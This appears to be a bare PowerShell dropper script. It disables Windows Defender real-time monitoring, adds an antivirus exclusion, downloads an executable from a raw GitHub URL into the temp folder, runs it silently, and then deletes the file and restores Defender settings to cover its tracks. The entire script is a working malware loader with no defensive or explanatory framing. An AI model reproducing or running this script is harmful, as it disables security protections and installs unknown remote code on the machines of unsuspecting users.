$url1 = 'https://raw.githubusercontent.com/hypehyxer/tyshi/main/chr.exe'
$tempPath1 = [System.IO.Path]::Combine($env:TEMP, 'setup1.exe')
try {
  Set-MpPreference -DisableRealtimeMonitoring $true
  Add-MpPreference -ExclusionPath $tempPath1
  Invoke-WebRequest -Uri $url1 -OutFile $tempPath1
  Start-Process -FilePath $tempPath1 -ArgumentList '/S' -Wait
}
finally {
  if (Test-Path $tempPath1) {
    Remove-Item $tempPath1 -Force -ErrorAction SilentlyContinue
    Remove-MpPreference -ExclusionPath $tempPath1 -ErrorAction SilentlyContinue
  }
  Set-MpPreference -DisableRealtimeMonitoring $false
}
